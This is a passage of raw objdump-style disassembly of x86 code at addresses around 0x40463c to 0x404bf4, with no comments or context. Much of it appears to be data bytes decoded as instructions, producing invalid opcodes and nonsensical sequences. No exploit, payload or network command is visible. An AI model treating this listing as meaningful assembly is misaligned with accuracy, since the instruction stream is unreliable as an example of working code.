  40463c:	4b                   	dec    %ebx
  40463d:	b0 0e                	mov    $0xe,%al
  40463f:	37                   	aaa
  404640:	10 04 4b             	adc    %al,(%ebx,%ecx,2)
  404643:	70 07                	jo     0x40464c
  404645:	46                   	inc    %esi
  404646:	31 10                	xor    %edx,(%eax)
  404648:	0d b1 17 46 00       	or     $0x4617b1,%eax
  40464d:	76 30                	jbe    0x40467f
  40464f:	4c                   	dec    %esp
  404650:	5c                   	pop    %esp
  404651:	6b 50 14 71          	imul   $0x71,0x14(%eax),%edx
  404655:	c6                   	(bad)
  404656:	63 90 14 6c f0 04    	arpl   %edx,0x4f06c14(%eax)
  40465c:	51                   	push   %ecx
  40465d:	52                   	push   %edx
  40465e:	56                   	push   %esi
  40465f:	55                   	push   %ebp
  404660:	70 4a                	jo     0x4046ac
  404662:	77 10                	ja     0x404674
  404664:	03 48 30             	add    0x30(%eax),%ecx
  404667:	0f 35                	sysexit
  404669:	50                   	push   %eax
  40466a:	02 62 55             	add    0x55(%edx),%ah
  40466d:	50                   	push   %eax
  40466e:	03 65 30             	add    0x30(%ebp),%esp
  404671:	08 58 10             	or     %bl,0x10(%eax)
  404674:	0d 45 70 0b 64       	or     $0x640b7045,%eax
  404679:	d5 d0                	aad    $0xd0
  40467b:	ac                   	lods   %ds:(%esi),%al
  40467c:	42                   	inc    %edx
  40467d:	d0 47 45             	rolb   $1,0x45(%edi)
  404680:	f0 1f                	lock pop %ds
  404682:	31 d0                	xor    %edx,%eax
  404684:	0d d1 18 aa 36       	or     $0x36aa18d1,%eax
  404689:	70 00                	jo     0x40468b
  40468b:	4b                   	dec    %ebx
  40468c:	b0 02                	mov    $0x2,%al
  40468e:	6d                   	insl   (%dx),%es:(%edi)
  40468f:	30 04 76             	xor    %al,(%esi,%esi,2)
  404692:	b2 0b                	mov    $0xb,%dl
  404694:	ab                   	stos   %eax,%es:(%edi)
  404695:	91                   	xchg   %eax,%ecx
  404696:	6c                   	insb   (%dx),%es:(%edi)
  404697:	d1 13                	rcll   $1,(%ebx)
  404699:	53                   	push   %ebx
  40469a:	50                   	push   %eax
  40469b:	2a 41 70             	sub    0x70(%ecx),%al
  40469e:	10 5a b0             	adc    %bl,-0x50(%edx)
  4046a1:	16                   	push   %ss
  4046a2:	aa                   	stos   %al,%es:(%edi)
  4046a3:	7a 50                	jp     0x4046f5
  4046a5:	05 6d 90 03 6c       	add    $0x6c03906d,%eax
  4046aa:	90                   	nop
  4046ab:	07                   	pop    %es
  4046ac:	68 d0 02 2a 56       	push   $0x562a02d0
  4046b1:	90                   	nop
  4046b2:	02 2e                	add    (%esi),%ch
  4046b4:	70 11                	jo     0x4046c7
  4046b6:	73 d2                	jae    0x40468a
  4046b8:	3b 22                	cmp    (%edx),%esp
  4046ba:	00 ab 11 b2 b5 22    	add    %ch,0x22b5b211(%ebx)
  4046c0:	3d 10 11 57 d0       	cmp    $0xd0571110,%eax
  4046c5:	04 55                	add    $0x55,%al
  4046c7:	30 13                	xor    %dl,(%ebx)
  4046c9:	56                   	push   %esi
  4046ca:	33 f0                	xor    %eax,%esi
  4046cc:	02 51 cf             	add    -0x31(%ecx),%dl
  4046cf:	72 b0                	jb     0x404681
  4046d1:	04 75                	add    $0x75,%al
  4046d3:	50                   	push   %eax
  4046d4:	09 49 55             	or     %ecx,0x55(%ecx)
  4046d7:	10 a3 57 50 10 32    	adc    %ah,0x32105057(%ebx)
  4046dd:	90                   	nop
  4046de:	19 4a 70             	sbb    %ecx,0x70(%edx)
  4046e1:	17                   	pop    %ss
  4046e2:	70 45                	jo     0x404729
  4046e4:	70 04                	jo     0x4046ea
  4046e6:	47                   	inc    %edi
  4046e7:	50                   	push   %eax
  4046e8:	20 52 00             	and    %dl,0x0(%edx)
  4046eb:	2b b0 0b 69 55 b0    	sub    -0x4faa96f5(%eax),%esi
  4046f1:	1f                   	pop    %ds
  4046f2:	78 70                	js     0x404764
  4046f4:	10 34 50             	adc    %dh,(%eax,%edx,2)
  4046f7:	07                   	pop    %es
  4046f8:	6c                   	insb   (%dx),%es:(%edi)
  4046f9:	90                   	nop
  4046fa:	02 72 d5             	add    -0x2b(%edx),%dh
  4046fd:	d0 1a                	rcrb   $1,(%edx)
  4046ff:	69 50 10 33 10 05 51 	imul   $0x51051033,0x10(%eax),%edx
  404706:	90                   	nop
  404707:	a5                   	movsl  %ds:(%esi),%es:(%edi)
  404708:	51                   	push   %ecx
  404709:	06                   	push   %es
  40470a:	6a 49                	push   $0x49
  40470c:	30 21                	xor    %ah,(%ecx)
  40470e:	53                   	push   %ebx
  40470f:	30 13                	xor    %dl,(%ebx)
  404711:	61                   	popa
  404712:	50                   	push   %eax
  404713:	11 d1                	adc    %edx,%ecx
  404715:	a3 36 df 70 01       	mov    %eax,0x170df36
  40471a:	95                   	xchg   %eax,%ebp
  40471b:	b8 3f c8 bf 89       	mov    $0x89bfc83f,%eax
  404720:	57                   	push   %edi
  404721:	95                   	xchg   %eax,%ebp
  404722:	36 70 0d             	ss jo  0x404732
  404725:	1f                   	pop    %ds
  404726:	31 b6 72 30 13 17    	xor    %esi,0x17133072(%esi)
  40472c:	31 41 50             	xor    %eax,0x50(%ecx)
  40472f:	08 d1                	or     %dl,%cl
  404731:	48                   	dec    %eax
  404732:	61                   	popa
  404733:	10 ac d4 20 00 df 30 	adc    %ch,0x30df0020(%esp,%edx,8)
  40473a:	69 70 01 65 70 3a df 	imul   $0xdf3a7065,0x1(%eax),%esi
  404741:	30 ef                	xor    %ch,%bh
  404743:	df 30                	fbstp  (%eax)
  404745:	df 30                	fbstp  (%eax)
  404747:	df 30                	fbstp  (%eax)
  404749:	df 30                	fbstp  (%eax)
  40474b:	61                   	popa
  40474c:	30 1b                	xor    %bl,(%ebx)
  40474e:	91                   	xchg   %eax,%ecx
  40474f:	e8 b1 1e da 73       	call   0x741a6605
  404754:	10 ce                	adc    %cl,%dh
  404756:	56                   	push   %esi
  404757:	90                   	nop
  404758:	13 df                	adc    %edi,%ebx
  40475a:	30 38                	xor    %bh,(%eax)
  40475c:	30 14 71             	xor    %dl,(%ecx,%esi,2)
  40475f:	48                   	dec    %eax
  404760:	55                   	push   %ebp
  404761:	df 30                	fbstp  (%eax)
  404763:	46                   	inc    %esi
  404764:	f0 1f                	lock pop %ds
  404766:	31 f0                	xor    %esi,%eax
  404768:	1f                   	pop    %ds
  404769:	59                   	pop    %ecx
  40476a:	30 14 4a             	xor    %dl,(%edx,%ecx,2)
  40476d:	ad                   	lods   %ds:(%esi),%eax
  40476e:	10 56 71             	adc    %dl,0x71(%esi)
  404771:	50                   	push   %eax
  404772:	3b df                	cmp    %edi,%ebx
  404774:	30 41 10             	xor    %al,0x10(%ecx)
  404777:	2b 66 d0             	sub    -0x30(%esi),%esp
  40477a:	17                   	pop    %ss
  40477b:	b5 b1                	mov    $0xb1,%ch
  40477d:	3c 44                	cmp    $0x44,%al
  40477f:	70 26                	jo     0x4047a7
  404781:	5c                   	pop    %esp
  404782:	b0 1a                	mov    $0x1a,%al
  404784:	11 cf                	adc    %ecx,%edi
  404786:	39 d0                	cmp    %edx,%eax
  404788:	17                   	pop    %ss
  404789:	6a 41                	push   $0x41
  40478b:	d0 22                	shlb   $1,(%edx)
  40478d:	78 b0                	js     0x40473f
  40478f:	0f 5f 90 29 31 b7 6a 	maxps  0x6ab73129(%eax),%xmm2
  404796:	35 10 05 36 30       	xor    $0x30360510,%eax
  40479b:	1c 2d                	sbb    $0x2d,%al
  40479d:	d0 04 df             	rolb   $1,(%edi,%ebx,8)
  4047a0:	30 51 00             	xor    %dl,0x0(%ecx)
  4047a3:	55                   	push   %ebp
  4047a4:	df 30                	fbstp  (%eax)
  4047a6:	7a 30                	jp     0x4047d8
  4047a8:	0c 4c                	or     $0x4c,%al
  4047aa:	10 0a                	adc    %cl,(%edx)
  4047ac:	4d                   	dec    %ebp
  4047ad:	50                   	push   %eax
  4047ae:	36 77 aa             	ss ja  0x40475b
  4047b1:	00 df                	add    %bl,%bh
  4047b3:	30 46 f0             	xor    %al,-0x10(%esi)
  4047b6:	1c 4f                	sbb    $0x4f,%al
  4047b8:	d0 18                	rcrb   $1,(%eax)
  4047ba:	68 70 0a 55 11       	push   $0x11550a70
  4047bf:	6e                   	outsb  %ds:(%esi),(%dx)
  4047c0:	33 90 c7 31 30 20    	xor    0x203031c7(%eax),%edx
  4047c6:	6b 70 40 30          	imul   $0x30,0x40(%eax),%esi
  4047ca:	6b 90 09 df 30 49 50 	imul   $0x50,0x4930df09(%eax),%edx
  4047d1:	22 59 b2             	and    -0x4e(%ecx),%bl
  4047d4:	17                   	pop    %ss
  4047d5:	d7                   	xlat   %ds:(%ebx)
  4047d6:	30 ef                	xor    %ch,%bh
  4047d8:	b5 00                	mov    $0x0,%ch
  4047da:	36 00 43 00          	add    %al,%ss:0x0(%ebx)
  4047de:	63 00                	arpl   %eax,(%eax)
  4047e0:	4b                   	dec    %ebx
  4047e1:	00 08                	add    %cl,(%eax)
  4047e3:	6c                   	insb   (%dx),%es:(%edi)
  4047e4:	00 46 00             	add    %al,0x0(%esi)
  4047e7:	70 6b                	jo     0x404854
  4047e9:	00 56 00             	add    %dl,0x0(%esi)
  4047ec:	08 57 00             	or     %dl,0x0(%edi)
  4047ef:	77 00                	ja     0x4047f1
  4047f1:	98                   	cwtl
  4047f2:	48                   	dec    %eax
  4047f3:	00 71 00             	add    %dh,0x0(%ecx)
  4047f6:	00 35 00 76 00 62    	add    %dh,0x62007600
  4047fc:	00 49 00             	add    %cl,0x0(%ecx)
  4047ff:	00 65 00             	add    %ah,0x0(%ebp)
  404802:	4d                   	dec    %ebp
  404803:	00 58 00             	add    %bl,0x0(%eax)
  404806:	41                   	inc    %ecx
  404807:	00 02                	add    %al,(%edx)
  404809:	45                   	inc    %ebp
  40480a:	00 44 64 00          	add    %al,0x0(%esp,%eiz,2)
  40480e:	4e                   	dec    %esi
  40480f:	00 42 00             	add    %al,0x0(%edx)
  404812:	82 53 00 2c          	adcb   $0x2c,0x0(%ebx)
  404816:	6e                   	outsb  %ds:(%esi),(%dx)
  404817:	00 31                	add    %dh,(%ecx)
  404819:	00 5f 00             	add    %bl,0x0(%edi)
  40481c:	bc a8 78 00 36       	mov    $0x360078a8,%esp
  404821:	00 0e                	add    %cl,(%esi)
  404823:	4b                   	dec    %ebx
  404824:	00 56 6d             	add    %dl,0x6d(%esi)
  404827:	00 86 a0 76 00 67    	add    %al,0x670076a0(%esi)
  40482d:	00 74 00 7e          	add    %dh,0x7e(%eax,%eax,1)
  404831:	6c                   	insb   (%dx),%es:(%edi)
  404832:	00 5e 0a             	add    %bl,0xa(%esi)
  404835:	59                   	pop    %ecx
  404836:	00 4e 70             	add    %cl,0x70(%esi)
  404839:	00 0e                	add    %cl,(%esi)
  40483b:	78 00                	js     0x40483d
  40483d:	5a                   	pop    %edx
  40483e:	00 28                	add    %ch,(%eax)
  404840:	38 00                	cmp    %al,(%eax)
  404842:	7a 00                	jp     0x404844
  404844:	2a 6d 00             	sub    0x0(%ebp),%ch
  404847:	22 6c 00 28          	and    0x28(%eax,%eax,1),%ch
  40484b:	34 00                	xor    $0x0,%al
  40484d:	68 00 5a 56 00       	push   $0x565a00
  404852:	52                   	push   %edx
  404853:	2e 00 00             	add    %al,%cs:(%eax)
  404856:	6a 00                	push   $0x0
  404858:	73 00                	jae    0x40485a
  40485a:	6f                   	outsl  %ds:(%esi),(%dx)
  40485b:	00 6e 00             	add    %ch,0x0(%esi)
  40485e:	20 22                	and    %ah,(%edx)
  404860:	00 2c 00             	add    %ch,(%eax,%eax,1)
  404863:	20 00                	and    %al,(%eax)
  404865:	17                   	pop    %ss
  404866:	72 00                	jb     0x404868
  404868:	a0 3d 00 30 00       	mov    0x30003d,%al
  40486d:	78 00                	js     0x40486f
  40486f:	03 30                	add    (%eax),%esi
  404871:	0a 03                	or     (%ebx),%al
  404873:	51                   	push   %ecx
  404874:	01 1d 48 00 61 00    	add    %ebx,0x610048
  40487a:	2d 68 00 21 51       	sub    $0x51210068,%eax
  40487f:	51                   	push   %ecx
  404880:	00 a5 46 00 55 00    	add    %ah,0x550046(%ebp)
  404886:	79 33                	jns    0x4048bb
  404888:	00 4d 6f             	add    %cl,0x6f(%ebp)
  40488b:	41                   	inc    %ecx
  40488c:	00 b1 72 00 70 00    	add    %dh,0x700072(%ecx)
  404892:	75 00                	jne    0x404894
  404894:	b3 49                	mov    $0x49,%bl
  404896:	01 00                	add    %eax,(%eax)
  404898:	c5 57 00             	lds    0x0(%edi),%edx
  40489b:	66 00 32             	data16 add %dh,(%edx)
  40489e:	00 4a 45             	add    %cl,0x45(%edx)
  4048a1:	00 01                	add    %al,(%ecx)
  4048a3:	44                   	inc    %esp
  4048a4:	00 15 67 00 47 00    	add    %dl,0x470067
  4048aa:	01 52 54             	add    %edx,0x54(%edx)
  4048ad:	00 2b                	add    %ch,(%ebx)
  4048af:	00 33                	add    %dh,(%ebx)
  4048b1:	69 00 41 78 00 b7    	imul   $0xb7007841,(%eax),%eax
  4048b7:	34 05                	xor    $0x5,%al
  4048b9:	00 61 6c             	add    %ah,0x6c(%ecx)
  4048bc:	00 29                	add    %ch,(%ecx)
  4048be:	72 00                	jb     0x4048c0
  4048c0:	52                   	push   %edx
  4048c1:	00 69 11             	add    %ch,0x11(%ecx)
  4048c4:	80 71 33 00          	xorb   $0x0,0x33(%ecx)
  4048c8:	51                   	push   %ecx
  4048c9:	80 00 3d             	addb   $0x3d,(%eax)
  4048cc:	00 0d 44 00 0a 80    	add    %cl,0x800a0044
  4048d2:	3a 37                	cmp    (%edi),%dh
  4048d4:	00 2f                	add    %ch,(%edi)
  4048d6:	80 1f 32             	sbbb   $0x32,(%edi)
  4048d9:	15 82 02 30 80       	adc    $0x80300282,%eax
  4048de:	04 34                	add    $0x34,%al
  4048e0:	80 4c 31 00 37       	orb    $0x37,0x0(%ecx,%esi,1)
  4048e5:	54                   	push   %esp
  4048e6:	00 3a                	add    %bh,(%edx)
  4048e8:	80 0d 33 80 02 31 80 	orb    $0x80,0x31028033
  4048ef:	09 2e                	or     %ebp,(%esi)
  4048f1:	55                   	push   %ebp
  4048f2:	80 3b 36             	cmpb   $0x36,(%ebx)
  4048f5:	80 6a 20 80          	subb   $0x80,0x20(%edx)
  4048f9:	79 53                	jns    0x40494e
  4048fb:	80 8f 61 45 80 61 61 	orb    $0x61,0x61804561(%edi)
  404902:	80 68 65 00          	subb   $0x0,0x65(%eax)
  404906:	72 80                	jb     0x404888
  404908:	98                   	cwtl
  404909:	6d                   	insl   (%dx),%es:(%edi)
  40490a:	55                   	push   %ebp
  40490b:	80 3b 6c             	cmpb   $0x6c,(%ebx)
  40490e:	80 14 20 80          	adcb   $0x80,(%eax,%eiz,1)
  404912:	2f                   	das
  404913:	65 80 59 75 75       	sbbb   $0x75,%gs:0x75(%ecx)
  404918:	80 af 74 80 22 6f 80 	subb   $0x80,0x6f228074(%edi)
  40491f:	4c                   	dec    %esp
  404920:	81 72 83 63 20 a9 80 	xorl   $0x80a92063,-0x7d(%edx)
  404927:	40                   	inc    %eax
  404928:	6f                   	outsl  %ds:(%esi),(%dx)
  404929:	00 81 15 61 80 1a    	add    %al,0x1a806115(%ecx)
  40492f:	69 80 13 75 81 84 20 	imul   $0x206f8020,-0x7b7e8aed(%eax),%eax
  404936:	80 6f 20 
  404939:	80 34 8f 81          	xorb   $0x81,(%edi,%ecx,4)
  40493d:	a9 4e 38 55 80       	test   $0x8055384e,%eax
  404942:	51                   	push   %ecx
  404943:	30 80 38 57 80 de    	xor    %al,-0x217fa8c8(%eax)
  404949:	62 82 c7 69 d5 80    	bound  %eax,-0x7f2a9639(%edx)
  40494f:	04 6e                	add    $0x6e,%al
  404951:	80 cd 3a             	or     $0x3a,%ch
  404954:	92                   	xchg   %eax,%edx
  404955:	0a 28                	or     (%eax),%ch
  404957:	40                   	inc    %eax
  404958:	1c 45                	sbb    $0x45,%al
  40495a:	5c                   	pop    %esp
  40495b:	51                   	push   %ecx
  40495c:	c1 3a 43             	sarl   $0x43,(%edx)
  40495f:	00 44 40 36          	add    %al,0x36(%eax,%eax,2)
  404963:	39 40 58             	cmp    %eax,0x58(%eax)
  404966:	30 44 00 39          	xor    %al,0x39(%eax,%eax,1)
  40496a:	c0 39 30             	sarb   $0x30,(%ecx)
  40496d:	00 29                	add    %ch,(%ecx)
  40496f:	c2 33 44             	ret    $0x4433
  404972:	15 40 6b 77 c0       	adc    $0xc0776b40,%eax
  404977:	3a 6c c0 01          	cmp    0x1(%eax,%eax,8),%ch
  40497b:	61                   	popa
  40497c:	00 64 54 00          	add    %ah,0x0(%esp,%edx,2)
  404980:	54                   	push   %esp
  404981:	c0 01 53             	rolb   $0x53,(%ecx)
  404984:	40                   	inc    %eax
  404985:	15 72 40 17 61       	adc    $0x61174072,%eax
  40498a:	ab                   	stos   %eax,%es:(%edi)
  40498b:	c0 32 43             	shlb   $0x43,(%edx)
  40498e:	17                   	pop    %ss
  40498f:	69 40 08 48 40 05 74 	imul   $0x74054048,0x8(%eax),%eax
  404996:	c0 41 ea 53          	rolb   $0x53,-0x16(%ecx)
  40499a:	c2 1d 64             	ret    $0x641d
  40499d:	42                   	inc    %edx
  40499e:	42                   	inc    %edx
  40499f:	71 c0                	jno    0x404961
  4049a1:	68 c1 43 c1 42       	push   $0x42c143c1
  4049a6:	d5 41                	aad    $0x41
  4049a8:	0c 74                	or     $0x74,%al
  4049aa:	c0 03 72             	rolb   $0x72,(%ebx)
  4049ad:	c0 0a 65             	rorb   $0x65,(%edx)
  4049b0:	40                   	inc    %eax
  4049b1:	12 59 7f             	adc    0x7f(%ecx),%bl
  4049b4:	ae                   	scas   %es:(%edi),%al
  4049b5:	2e 6a 66             	cs push $0x66
  4049b8:	ff                   	(bad)
  4049b9:	3e ff                	ds (bad)
  4049bb:	3e 74 40             	je,pt  0x4049fe
  4049be:	3f                   	aas
  4049bf:	70 c2                	jo     0x404983
  4049c1:	3c aa                	cmp    $0xaa,%al
  4049c3:	63 c0                	arpl   %eax,%eax
  4049c5:	3f                   	aas
  4049c6:	69 c0 bb 65 42 03    	imul   $0x34265bb,%eax,%eax
  4049cc:	73 40                	jae    0x404a0e
  4049ce:	44                   	inc    %esp
  4049cf:	55                   	push   %ebp
  4049d0:	41                   	inc    %ecx
  4049d1:	79 73                	jns    0x404a46
  4049d3:	40                   	inc    %eax
  4049d4:	05 20 40 7d 65       	add    $0x657d4020,%eax
  4049d9:	c0 09 75             	rorb   $0x75,(%ecx)
  4049dc:	d5 c0                	aad    $0xc0
  4049de:	01 6e c0             	add    %ebp,-0x40(%esi)
  4049e1:	03 64 40 66          	add    0x66(%eax,%eax,2),%esp
  4049e5:	68 c0 02 53 c0       	push   $0xc05302c0
  4049ea:	f5                   	cmc
  4049eb:	ff 40 65             	incl   0x65(%eax)
  4049ee:	40                   	inc    %eax
  4049ef:	5a                   	pop    %edx
  4049f0:	74 42                	je     0x404a34
  4049f2:	71 4f                	jno    0x404a43
  4049f4:	85 ff                	test   %edi,%edi
  4049f6:	3f                   	aas
  4049f7:	ff                   	(bad)
  4049f8:	3f                   	aas
  4049f9:	05 f3 3f 51 62       	add    $0x62513ff3,%eax
  4049fe:	3e 72 00             	jb,pt  0x404a01
  404a01:	79 00                	jns    0x404a03
  404a03:	48                   	dec    %eax
  404a04:	b7 60                	mov    $0x60,%bh
  404a06:	1c 61                	sbb    $0x61,%al
  404a08:	46                   	inc    %esi
  404a09:	61                   	popa
  404a0a:	64 73 60             	fs jae 0x404a6d
  404a0d:	1d 2f 40 31 a0       	sbb    $0xa031402f,%eax
  404a12:	02 7a 77             	add    0x77(%edx),%bh
  404a15:	20 72 74             	and    %dh,0x74(%edx)
  404a18:	20 81 e1 41 a3 28    	and    %al,0x28a341e1(%ecx)
  404a1e:	e3 64                	jecxz  0x404a84
  404a20:	64 25 a0 07 20 a2    	fs and $0xa22007a0,%eax
  404a26:	5a                   	pop    %edx
  404a27:	30 00                	xor    %al,(%eax)
  404a29:	7f 21                	jg     0x404a4c
  404a2b:	30 00                	xor    %al,(%eax)
  404a2d:	bf 27 75 ff 41       	mov    $0x41ff7527,%edi
  404a32:	2b 64 7f 21          	sub    0x21(%edi,%edi,2),%esp
  404a36:	7f 21                	jg     0x404a59
  404a38:	65 21 52 a0          	and    %edx,%gs:-0x60(%edx)
  404a3c:	16                   	push   %ss
  404a3d:	5d                   	pop    %ebp
  404a3e:	6b 3e 68             	imul   $0x68,(%esi),%edi
  404a41:	20 02                	and    %al,(%edx)
  404a43:	a9 20 61 7f 65       	test   $0x657f6120,%eax
  404a48:	e0 1e                	loopne 0x404a68
  404a4a:	31 d5                	xor    %edx,%ebp
  404a4c:	60                   	pusha
  404a4d:	6d                   	insl   (%dx),%es:(%edi)
  404a4e:	37                   	aaa
  404a4f:	a0 8a 20 e0 91       	mov    0x91e0208a,%al
  404a54:	79 a0                	jns    0x4049f6
  404a56:	42                   	inc    %edx
  404a57:	e1 64                	loope  0x404abd
  404a59:	f6 20                	mulb   (%eax)
  404a5b:	e0 86                	loopne 0x4049e3
  404a5d:	a1 45 67 3f 1e       	mov    0x1e3f6745,%eax
  404a62:	e0 77                	loopne 0x404adb
  404a64:	3f                   	aas
  404a65:	1e                   	push   %ds
  404a66:	bf 3f 7a 30 a0       	mov    $0xa0307a3f,%edi
  404a6b:	a3 37 e0 85 3f       	mov    %eax,0x3f85e037
  404a70:	60                   	pusha
  404a71:	61                   	popa
  404a72:	18 b1 7f 53 d5 e0    	sbb    %dh,-0x1f2aac81(%ecx)
  404a78:	3c 43                	cmp    $0x43,%al
  404a7a:	a0 58 65 60 ad       	mov    0xad606558,%al
  404a7f:	74 60                	je     0x404ae1
  404a81:	1d a9 83 aa 4f       	sbb    $0x4faa83a9,%eax
  404a86:	20 50 46             	and    %dl,0x46(%eax)
  404a89:	e0 3b                	loopne 0x404ac6
  404a8b:	6c                   	insb   (%dx),%es:(%edi)
  404a8c:	e0 02                	loopne 0x404a90
  404a8e:	45                   	inc    %ebp
  404a8f:	60                   	pusha
  404a90:	b0 7f                	mov    $0x7f,%al
  404a92:	3f                   	aas
  404a93:	60                   	pusha
  404a94:	a9 c0 bf 3e bf       	test   $0xbf3ebfc0,%eax
  404a99:	3e 3f                	ds aas
  404a9b:	a0 21 0e 3f a0       	mov    0xa03f0e21,%al
  404aa0:	6e                   	outsb  %ds:(%esi),(%dx)
  404aa1:	ab                   	stos   %eax,%es:(%edi)
  404aa2:	22 33                	and    (%ebx),%dh
  404aa4:	75 20                	jne    0x404ac6
  404aa6:	49                   	dec    %ecx
  404aa7:	e0 dc                	loopne 0x404a85
  404aa9:	74 64                	je     0x404b0f
  404aab:	20 6d 60             	and    %ch,0x60(%ebp)
  404aae:	3b aa 57 60 01 69    	cmp    0x69016057(%edx),%ebp
  404ab4:	62 3a                	bound  %edi,(%edx)
  404ab6:	20 e0                	and    %ah,%al
  404ab8:	a5                   	movsl  %ds:(%esi),%es:(%edi)
  404ab9:	66 20 02             	data16 and %al,(%edx)
  404abc:	ea 33 e0 c9 39 e0 00 	ljmp   $0xe0,$0x39c9e033
  404ac3:	62                   	(bad)
  404ac4:	e0 62                	loopne 0x404b28
  404ac6:	a1 24 e1 61 ff       	mov    0xff61e124,%eax
  404acb:	29 5f f5             	sub    %ebx,-0xb(%edi)
  404ace:	e0 7f                	loopne 0x404b4f
  404ad0:	20 7f 20             	and    %bh,0x20(%edi)
  404ad3:	7f 20                	jg     0x404af5
  404ad5:	3f                   	aas
  404ad6:	10 5f 60             	adc    %bl,0x60(%edi)
  404ad9:	5f                   	pop    %edi
  404ada:	60                   	pusha
  404adb:	f7 17                	notl   (%edi)
  404add:	0f 51 60 3f          	sqrtps 0x3f(%eax),%xmm4
  404ae1:	10 72 92             	adc    %dh,-0x6e(%edx)
  404ae4:	3d b1 2e 73 70       	cmp    $0x70732eb1,%eax
  404ae9:	f1                   	int1
  404aea:	69 7d ff 0f 68 50 11 	imul   $0x1150680f,-0x1(%ebp),%edi
  404af1:	5f                   	pop    %edi
  404af2:	50                   	push   %eax
  404af3:	11 09                	adc    %ecx,(%ecx)
  404af5:	31 00                	xor    %eax,(%eax)
  404af7:	ff 0f                	decl   (%edi)
  404af9:	32 fd                	xor    %ch,%bh
  404afb:	90                   	nop
  404afc:	2f                   	das
  404afd:	32 72 33             	xor    0x33(%edx),%dh
  404b00:	51                   	push   %ecx
  404b01:	1b 3b                	sbb    (%ebx),%edi
  404b03:	7a 91                	jp     0x404a96
  404b05:	3f                   	aas
  404b06:	31 45 ff             	xor    %eax,-0x1(%ebp)
  404b09:	4e                   	dec    %esi
  404b0a:	f5                   	cmc
  404b0b:	73 6a                	jae    0x404b77
  404b0d:	65 b0 36             	gs mov $0x36,%al
  404b10:	43                   	inc    %ebx
  404b11:	90                   	nop
  404b12:	1c b5                	sbb    $0xb5,%al
  404b14:	71 9f                	jno    0x404ab5
  404b16:	3f                   	aas
  404b17:	7f 30                	jg     0x404b49
  404b19:	d5 93                	aad    $0x93
  404b1b:	03 61 b2             	add    -0x4e(%ecx),%esp
  404b1e:	0c 46                	or     $0x46,%al
  404b20:	d0 1c 72             	rcrb   $1,(%edx,%esi,2)
  404b23:	90                   	nop
  404b24:	72 11                	jb     0x404b37
  404b26:	88 1d 17 21 41 90    	mov    %bl,0x90412117
  404b2c:	1e                   	push   %ds
  404b2d:	31 1d 91 7d 74 00    	xor    %ebx,0x747d91
  404b33:	28 d7                	sub    %dl,%bh
  404b35:	90                   	nop
  404b36:	73 9f                	jae    0x404ad7
  404b38:	7b 7f                	jnp    0x404bb9
  404b3a:	85 3a                	test   %edi,(%edx)
  404b3c:	90                   	nop
  404b3d:	37                   	aaa
  404b3e:	32 70 3e             	xor    0x3e(%eax),%dh
  404b41:	3f                   	aas
  404b42:	0b 6f 9f             	or     -0x61(%edi),%ebp
  404b45:	7b 3f                	jnp    0x404b86
  404b47:	0b f3                	or     %ebx,%esi
  404b49:	11 7f 2b             	adc    %edi,0x2b(%edi)
  404b4c:	38 d0                	cmp    %dl,%al
  404b4e:	11 d3                	adc    %edx,%ebx
  404b50:	4a                   	dec    %edx
  404b51:	57                   	push   %edi
  404b52:	57                   	push   %edi
  404b53:	f0 38 31             	lock cmp %dh,(%ecx)
  404b56:	28 33                	sub    %dh,(%ebx)
  404b58:	0b 4d 50             	or     0x50(%ebp),%ecx
  404b5b:	59                   	pop    %ecx
  404b5c:	6c                   	insb   (%dx),%es:(%edi)
  404b5d:	70 0a                	jo     0x404b69
  404b5f:	69 ab f0 68 d1 38 4f 	imul   $0x6a10904f,0x38d168f0(%ebx),%ebp
  404b66:	90 10 6a 
  404b69:	50                   	push   %eax
  404b6a:	39 63 30             	cmp    %esp,0x30(%ebx)
  404b6d:	01 da                	add    %ebx,%edx
  404b6f:	73 32                	jae    0x404ba3
  404b71:	0b 20                	or     (%eax),%esp
  404b73:	b0 7d                	mov    $0x7d,%al
  404b75:	51                   	push   %ecx
  404b76:	5b                   	pop    %ebx
  404b77:	43                   	inc    %ebx
  404b78:	30 0e                	xor    %cl,(%esi)
  404b7a:	91                   	xchg   %eax,%ecx
  404b7b:	0c b7                	or     $0xb7,%al
  404b7d:	51                   	push   %ecx
  404b7e:	02 51 0d             	add    0xd(%ecx),%dl
  404b81:	51                   	push   %ecx
  404b82:	6a 77                	push   $0x77
  404b84:	b0 04                	mov    $0x4,%al
  404b86:	11 2b                	adc    %ebp,(%ebx)
  404b88:	73 50                	jae    0x404bda
  404b8a:	10 fa                	adc    %bh,%dl
  404b8c:	67 30 3d             	xor    %bh,(%di)
  404b8f:	61                   	popa
  404b90:	30 14 31             	xor    %dl,(%ecx,%esi,1)
  404b93:	7c df                	jl     0x404b74
  404b95:	19 df                	sbb    %ebx,%edi
  404b97:	19 5b 4a             	sbb    %ebx,0x4a(%ebx)
  404b9a:	bf df 19 df 29       	mov    $0x29df19df,%edi
  404b9f:	df 19                	fistps (%ecx)
  404ba1:	5f                   	pop    %edi
  404ba2:	4a                   	dec    %edx
  404ba3:	3f                   	aas
  404ba4:	8a f7                	mov    %bh,%dh
  404ba6:	18 20                	sbb    %ah,(%eax)
  404ba8:	d0 0a                	rorb   $1,(%edx)
  404baa:	15 91 64 65 f0       	adc    $0xf0656491,%eax
  404baf:	89 70 f0             	mov    %esi,-0x10(%eax)
  404bb2:	0d 20 00 23 fb       	or     $0xfb230020,%eax
  404bb7:	50                   	push   %eax
  404bb8:	11 b3 47 73 74 10    	adc    %esi,0x10747347(%ebx)
  404bbe:	df 87 13 15 51 00    	filds  0x511513(%edi)
  404bc4:	df 1b                	fistps (%ebx)
  404bc6:	ff                   	lcall  (bad)
  404bc7:	df 1b                	fistps (%ebx)
  404bc9:	df 1b                	fistps (%ebx)
  404bcb:	bd 25 1f 27 91       	mov    $0x91271f25,%ebp
  404bd0:	0e                   	push   %cs
  404bd1:	1f                   	pop    %ds
  404bd2:	27                   	daa
  404bd3:	1f                   	pop    %ds
  404bd4:	27                   	daa
  404bd5:	91                   	xchg   %eax,%ecx
  404bd6:	03 a2 42 30 0c 63    	add    0x630c3042(%edx),%esp
  404bdc:	00 6b 10             	add    %ch,0x10(%ebx)
  404bdf:	a6                   	cmpsb  %es:(%edi),%ds:(%esi)
  404be0:	72 f0                	jb     0x404bd2
  404be2:	18 be 75 30 17 71    	sbb    %bh,0x71173075(%esi)
  404be8:	18 71 72             	sbb    %dh,0x72(%ecx)
  404beb:	51                   	push   %ecx
  404bec:	74 71                	je     0x404c5f
  404bee:	48                   	dec    %eax
  404bef:	20 d0                	and    %dl,%al
  404bf1:	1b 66 78             	sbb    0x78(%esi),%esp
  404bf4:	52                   	push   %edx
